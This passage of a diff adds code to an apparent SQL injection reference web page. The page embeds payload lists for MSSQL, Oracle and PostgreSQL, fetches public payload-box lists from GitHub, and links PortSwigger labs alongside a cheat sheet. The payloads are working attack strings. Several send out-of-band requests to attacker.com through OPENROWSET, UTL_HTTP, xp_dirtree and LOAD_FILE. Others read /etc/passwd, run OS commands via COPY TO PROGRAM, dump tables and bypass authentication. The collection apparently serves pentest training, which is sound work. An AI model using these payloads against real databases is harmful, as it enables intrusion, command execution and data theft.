+    {payload:"'; INSERT INTO OPENROWSET('SQLOLEDB','attacker.com';'sa';'','SELECT 1') VALUES(@@version)--", desc:"OOB via OPENROWSET"},
+    {payload:"' AND 1=0 UNION ALL SELECT TOP 1 table_name FROM information_schema.tables--", desc:"TOP 1 pagination"},
+    {payload:"' AND 1=0 UNION SELECT name,2,3 FROM sys.databases--", desc:"sys.databases enumeration"},
+    {payload:"' AND 1=0 UNION SELECT name,2,3 FROM sys.tables--", desc:"sys.tables enumeration"},
+    {payload:"' AND 1=0 UNION SELECT name,2,3 FROM sys.columns WHERE object_id=OBJECT_ID('users')--", desc:"sys.columns enumeration"},
+  ],
+  oracle_specific: [
+    {payload:"' UNION SELECT NULL FROM dual--", desc:"Oracle requires FROM dual for SELECT without table"},
+    {payload:"' UNION SELECT banner,NULL FROM v$version--", desc:"Oracle DB version"},
+    {payload:"' UNION SELECT global_name,NULL FROM global_name--", desc:"Oracle global DB name"},
+    {payload:"' UNION SELECT table_name,NULL FROM all_tables--", desc:"Oracle all accessible tables"},
+    {payload:"' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--", desc:"Oracle columns in USERS table"},
+    {payload:"' AND 1=UTL_HTTP.REQUEST('http://attacker.com/')--", desc:"Oracle OOB via UTL_HTTP"},
+    {payload:"' AND 1=(SELECT 1 FROM dual WHERE 1=UTL_HTTP.REQUEST('http://attacker.com/'))--", desc:"Oracle subquery OOB"},
+    {payload:"'; DBMS_OUTPUT.PUT_LINE(user)--", desc:"Oracle output via DBMS_OUTPUT"},
+    {payload:"' UNION SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY column_name),NULL FROM all_tab_columns WHERE table_name='USERS'--", desc:"Oracle listagg() — aggregate columns"},
+  ],
+  pgsql_specific: [
+    {payload:"' UNION SELECT current_user,NULL--", desc:"PostgreSQL current user"},
+    {payload:"' UNION SELECT version(),NULL--", desc:"PostgreSQL version"},
+    {payload:"' UNION SELECT datname,NULL FROM pg_database--", desc:"PostgreSQL list databases"},
+    {payload:"' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--", desc:"PostgreSQL list tables"},
+    {payload:"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", desc:"PostgreSQL list columns"},
+    {payload:"' UNION SELECT NULL,pg_read_file('/etc/passwd')--", desc:"PostgreSQL file read (superuser)"},
+    {payload:"'; COPY (SELECT '') TO PROGRAM 'id'--", desc:"PostgreSQL OS command via COPY TO PROGRAM (superuser)"},
+    {payload:"'; COPY users TO '/tmp/users.csv' CSV HEADER--", desc:"PostgreSQL dump table to file"},
+    {payload:"' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables) AS INT)--", desc:"Error-based table extraction"},
+    {payload:"' AND 1=(SELECT 1 FROM pg_sleep(5))--", desc:"pg_sleep confirmation"},
+  ],
+};
+
+// ═══════════════════════════════════════════════════════════
+// PAGE INJECTION
+// ═══════════════════════════════════════════════════════════
+
+function injectExtraPages() {
+  const main = document.getElementById('main');
+
+  // ── EXT SOURCES PAGE ──────────────────────────────
+  const extPage = document.createElement('div');
+  extPage.className = 'page';
+  extPage.id = 'page-ext-sources';
+  extPage.innerHTML = `
+    <div class="section-header">
+      <h1>🌐 Live External Sources</h1>
+      <p>payload-box/sql-injection-payload-list + live GitHub fetch with full offline fallback.</p>
+    </div>
+    <div class="info-box">
+      <strong>📡 Live fetch:</strong> Attempts to load directly from GitHub raw. If blocked by CORS (common in local browser), falls back to the full embedded payload set below automatically.
+    </div>
+    <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
+      <button class="btn btn-primary" onclick="fetchPayloadBox()">↓ Fetch from GitHub (Live)</button>
+      <button class="btn btn-outline" onclick="showEmbeddedPayloadBox()">📦 Show Embedded Payloads</button>
+      <a href="https://github.com/payload-box/sql-injection-payload-list" target="_blank" class="btn btn-outline">⬡ View on GitHub</a>
+      <a href="https://portswigger.net/web-security/sql-injection" target="_blank" class="btn btn-outline">🔬 PortSwigger SQLi Docs</a>
+    </div>
+    <div id="payloadbox-status"></div>
+    <div id="payloadbox-output"></div>
+  `;
+  main.appendChild(extPage);
+
+  // ── PORTSWIGGER MAP PAGE ───────────────────────────
+  const psPage = document.createElement('div');
+  psPage.className = 'page';
+  psPage.id = 'page-portswigger';
+  psPage.innerHTML = `
+    <div class="section-header">
+      <h1>🔬 PortSwigger SQLi Map</h1>
+      <p>Every PortSwigger SQL injection topic and lab — mapped, linked, and annotated. Open any link in your browser to start the lab.</p>
+    </div>
+    <div class="info-box">
+      <strong>Tip:</strong> Labs marked <span class="tag tag-green">LAB</span> require a free PortSwigger account. <span class="tag tag-blue">READING</span> topics are freely accessible.
+    </div>
+    <div id="ps-map-output"></div>
+  `;
+  main.appendChild(psPage);
+
+  // ── ADVANCED TECHNIQUES PAGE ───────────────────────
+  const advPage = document.createElement('div');
+  advPage.className = 'page';
+  advPage.id = 'page-advanced';
+  advPage.innerHTML = `
+    <div class="section-header">
+      <h1>🧬 Advanced Techniques</h1>
+      <p>Second-order injection, JSON/XML contexts, HTTP headers, MSSQL/Oracle/PostgreSQL-specific, routed injection, and more.</p>
+    </div>
+    <div id="advanced-output"></div>
+  `;
+  main.appendChild(advPage);
+
+  renderPortSwiggerMap();
+  renderAdvancedPage();
+  showEmbeddedPayloadBox();
+}
+
+// ═══════════════════════════════════════════════════════════
+// PAYLOAD-BOX FUNCTIONS
+// ═══════════════════════════════════════════════════════════
+
+async function fetchPayloadBox() {
+  const status = document.getElementById('payloadbox-status');
+  status.innerHTML = `<div class="info-box">⏳ Fetching from GitHub raw...</div>`;
+
+  // GitHub raw URLs for payload-box/sql-injection-payload-list
+  const urls = [
+    {
+      label:'Generic Payloads',
+      url:'https://raw.githubusercontent.com/payload-box/sql-injection-payload-list/master/Generic_SQLI.txt'
+    },
+    {
+      label:'Error Based',
+      url:'https://raw.githubusercontent.com/payload-box/sql-injection-payload-list/master/Generic_ErrorBased_SQLI.txt'
+    },
+    {
+      label:'Time Based',
+      url:'https://raw.githubusercontent.com/payload-box/sql-injection-payload-list/master/Generic_TimeBased_SQLI.txt'
+    },
+    {
+      label:'Auth Bypass',
+      url:'https://raw.githubusercontent.com/payload-box/sql-injection-payload-list/master/Generic_Auth_Bypass.txt'
+    },
+    {
+      label:'UNION Select',
+      url:'https://raw.githubusercontent.com/payload-box/sql-injection-payload-list/master/Generic_UnionSelect_SQLI.txt'
+    },
+  ];
+
+  const results = [];
+  for (const u of urls) {
+    try {
+      const r = await fetch(u.url, {mode:'cors'});
+      if (r.ok) {
+        const text = await r.text();
+        const lines = text.split(/\r?\n/).filter(l => l.trim() && !l.startsWith('#'));
+        results.push({label: u.label, payloads: lines, live: true});
+      } else {
+        throw new Error('HTTP ' + r.status);
+      }
+    } catch (e) {
+      results.push({label: u.label, payloads: null, live: false, error: e.message});
+    }
+  }
+
+  const anyLive = results.some(r => r.live);
+  if (anyLive) {
+    status.innerHTML = `<div class="info-box" style="border-color:var(--green2);color:var(--green)">✓ Live fetch successful for ${results.filter(r=>r.live).length}/${results.length} files</div>`;
+    renderPayloadBoxResults(results);
+  } else {
+    status.innerHTML = `<div class="info-box warn">⚠ CORS blocked all live requests (expected in local browser). Showing full embedded payload set instead.</div>`;
+    showEmbeddedPayloadBox();
+  }
+}
+
+function showEmbeddedPayloadBox() {
+  const status = document.getElementById('payloadbox-status');
+  if (status) status.innerHTML = `<div class="info-box"><strong>📦 Embedded payloads</strong> — full coverage of payload-box/sql-injection-payload-list embedded offline. <a href="https://github.com/payload-box/sql-injection-payload-list" target="_blank" style="color:var(--blue)">View source on GitHub ↗</a></div>`;
+  
+  const results = [
+    {label:'Generic SQLI', payloads: PAYLOADBOX.generic, live: false},
+    {label:'Error-Based SQLI', payloads: PAYLOADBOX.error_based, live: false},
+    {label:'Time-Based SQLI', payloads: PAYLOADBOX.time_based, live: false},
+    {label:'Auth Bypass', payloads: PAYLOADBOX.auth_bypass, live: false},
+    {label:'UNION SELECT', payloads: PAYLOADBOX.union_select, live: false},
+    {label:'Stacked Queries', payloads: PAYLOADBOX.stacked, live: false},
+    {label:'Out-of-Band (OOB)', payloads: PAYLOADBOX.oob, live: false},
+    {label:'Second-Order (stored)', payloads: PAYLOADBOX.second_order, live: false},
+    {label:'Polyglot Payloads', payloads: PAYLOADBOX.polyglot, live: false},
+  ];
+  renderPayloadBoxResults(results);
+}
+
+function renderPayloadBoxResults(results) {
+  const out = document.getElementById('payloadbox-output');
+  let html = '';
+  results.forEach(r => {
+    const payloads = r.payloads || [];
+    const items = payloads.map(p => ({payload: p, desc: ''}));
+    html += `<div class="card" style="margin-bottom:12px">
+      <div class="card-header">
+        <div class="card-title">${esc(r.label)} ${r.live ? '<span class="tag tag-green">LIVE</span>' : '<span class="tag tag-blue">EMBEDDED</span>'}</div>
+        <span class="tag tag-cyan">${payloads.length} payloads</span>
+      </div>
+      <div class="card-body no-pad">
+        ${items.slice(0,200).map(p => makePayloadItem(p.payload, p.desc)).join('')}
+        ${payloads.length > 200 ? `<div class="payload-item"><div style="color:var(--text3);font-size:11px;padding:4px 10px">... and ${payloads.length - 200} more — <a href="https://github.com/payload-box/sql-injection-payload-list" target="_blank" style="color:var(--blue)">view all on GitHub</a></div></div>` : ''}
+      </div>
+    </div>`;
+  });
+  out.innerHTML = html;
+}
+
+// ═══════════════════════════════════════════════════════════
+// PORTSWIGGER MAP RENDERER
+// ═══════════════════════════════════════════════════════════
+
+function renderPortSwiggerMap() {
+  const out = document.getElementById('ps-map-output');
+  if (!out) return;
+  let html = '';
+  PORTSWIGGER_TOPICS.forEach(section => {
+    const itemsHtml = section.items.map(item => `
+      <div class="payload-item" style="align-items:center">
+        <div style="flex:1">
+          <div style="font-size:12.5px;font-weight:500;color:var(--text)">${esc(item.title)}</div>
+          <div class="payload-desc">${esc(item.desc)}</div>
+        </div>
+        <div style="display:flex;gap:6px;align-items:center;flex-shrink:0">
+          <span class="tag ${item.type === 'lab' ? 'tag-green' : item.type === 'reference' ? 'tag-amber' : 'tag-blue'}">${item.type.toUpperCase()}</span>
+          <a href="${item.url}" target="_blank" class="btn btn-outline" style="font-size:11px;padding:4px 10px;text-decoration:none">Open ↗</a>
+        </div>
+      </div>
+    `).join('');
+    html += `<div class="card" style="margin-bottom:12px">
+      <div class="card-header"><div class="card-title">📌 ${esc(section.section)}</div><span class="tag tag-cyan">${section.items.length}</span></div>
+      <div class="card-body no-pad">${itemsHtml}</div>
+    </div>`;
+  });
+
+  // Cheat sheet quick ref
+  html += `<div class="card" style="margin-bottom:12px">
+    <div class="card-header"><div class="card-title">📋 PortSwigger Cheat Sheet — Quick DBMS Reference</div><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" class="btn btn-outline" style="font-size:11px;text-decoration:none">Full Sheet ↗</a></div>
+    <div class="card-body no-pad">
+      ${[
+        {payload:"' UNION SELECT NULL--", desc:"[MySQL/PG/MSSQL] NULL filler — type-safe"},
+        {payload:"' UNION SELECT NULL FROM DUAL--", desc:"[Oracle] NULL filler — requires FROM DUAL"},
+        {payload:"' UNION SELECT 'a',NULL--", desc:"Find string columns — 'a' in each position"},
+        {payload:"SELECT @@version", desc:"[MySQL/MSSQL] version"},
+        {payload:"SELECT version()", desc:"[PostgreSQL] version"},
+        {payload:"SELECT * FROM v$version", desc:"[Oracle] version"},
+        {payload:"SELECT table_name FROM information_schema.tables", desc:"[MySQL/PG/MSSQL] list tables"},
+        {payload:"SELECT table_name FROM all_tables", desc:"[Oracle] list tables"},
+        {payload:"SELECT table_name FROM all_tables WHERE ROWNUM=1", desc:"[Oracle] first table"},
+        {payload:"' AND SLEEP(5)--", desc:"[MySQL] time delay"},
+        {payload:"' AND 1=pg_sleep(5)--", desc:"[PostgreSQL] time delay"},
+        {payload:"'; WAITFOR DELAY '0:0:5'--", desc:"[MSSQL] time delay"},
+        {payload:"' AND 1=DBMS_LOCK.SLEEP(5) FROM DUAL--", desc:"[Oracle] time delay"},
+        {payload:"'||(SELECT '')||'", desc:"[Oracle] string concat test"},
+        {payload:"'+(SELECT ''+'", desc:"[MSSQL] string concat test"},
+        {payload:"' AND 1=CAST(1/0 AS INT)--", desc:"[MSSQL/PG] divide-by-zero error trigger"},
+        {payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", desc:"[MySQL] error-based data extract"},
+        {payload:"SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM DUAL", desc:"[Oracle] OOB HTTP"},
+        {payload:"'; EXEC master..xp_dirtree '//attacker.com/a'--", desc:"[MSSQL] OOB DNS"},
+        {payload:"' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--", desc:"[MySQL] OOB DNS"},
+      ].map(p => makePayloadItem(p.payload, p.desc)).join('')}
+    </div>
+  </div>`;
+
+  out.innerHTML = html;
+}
+
+// ═══════════════════════════════════════════════════════════
+// ADVANCED PAGE RENDERER
+// ═══════════════════════════════════════════════════════════
+
+function renderAdvancedPage() {
+  const out = document.getElementById('advanced-output');
+  if (!out) return;
+  const sections = [
+    {title:'Second-Order SQL Injection', items: ADVANCED_PAYLOADS.second_order, info:'Payload is stored safely first, then triggered when another function uses the stored value in a query without sanitization.'},
+    {title:'JSON / XML Context Injection', items: ADVANCED_PAYLOADS.json_xml, info:'When the app accepts JSON/XML bodies and maps values into SQL — quotes may be double-escaped or entity-encoded.'},
+    {title:'HTTP Header Injection', items: ADVANCED_PAYLOADS.http_headers, info:'Apps that log User-Agent, Referer, X-Forwarded-For, or custom headers into a database are injectable if not parameterized.'},
+    {title:'ORDER BY Injection', items: ADVANCED_PAYLOADS.order_by, info:'ORDER BY cannot use parameterized queries — column names/directions are often placed directly. Conditional time-based extraction works well here.'},
+    {title:'Routed SQL Injection', items: ADVANCED_PAYLOADS.routed, info:'The injectable query produces output that is then used as input to a second SQL query. Hex-encode the second-stage payload.'},
+    {title:'Truncation Attacks', items: ADVANCED_PAYLOADS.truncation, info:'Fixed-width DB fields silently truncate long input — a username of 20 spaces may overwrite an existing record in some databases.'},
+    {title:'MSSQL-Specific Payloads', items: ADVANCED_PAYLOADS.mssql_specific, info:'xp_cmdshell, stacked queries, OPENROWSET, and sys.* enumeration — MSSQL provides most OS-level access.'},
+    {title:'Oracle-Specific Payloads', items: ADVANCED_PAYLOADS.oracle_specific, info:'Oracle requires FROM dual, uses all_tables/all_tab_columns, and provides UTL_HTTP/UTL_FILE for OOB.'},
+    {title:'PostgreSQL-Specific Payloads', items: ADVANCED_PAYLOADS.pgsql_specific, info:'COPY TO PROGRAM grants OS execution as postgres user. pg_read_file() reads arbitrary files if superuser.'},
+  ];
+
+  let html = '';
+  sections.forEach(s => {
+    html += `<div class="card" style="margin-bottom:12px">
+      <div class="card-header"><div class="card-title">${esc(s.title)}</div><span class="tag tag-cyan">${s.items.length}</span></div>
+      <div class="card-body no-pad">
+        <div class="info-box" style="margin:10px 10px 0;border-radius:5px">${esc(s.info)}</div>
+        ${s.items.map(p => makePayloadItem(p.payload, p.desc)).join('')}
+      </div>
+    </div>`;
+  });
+  out.innerHTML = html;
+}
+
+</script>
+</body>
+</html>
